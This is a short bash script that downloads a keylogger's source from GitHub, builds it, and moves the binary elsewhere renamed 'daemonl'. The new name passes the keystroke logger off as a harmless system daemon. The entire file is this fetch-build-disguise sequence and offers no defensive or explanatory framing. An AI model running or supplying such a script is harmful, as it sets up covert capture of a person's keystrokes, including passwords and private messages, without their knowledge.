#!/bin/bash

wget https://github.com/gsingh93/simple-key-logger/archive/master.zip
unzip master.zip
cd simple-key-logger-master
make
mv skeylogger ../../daemonl
cd ..

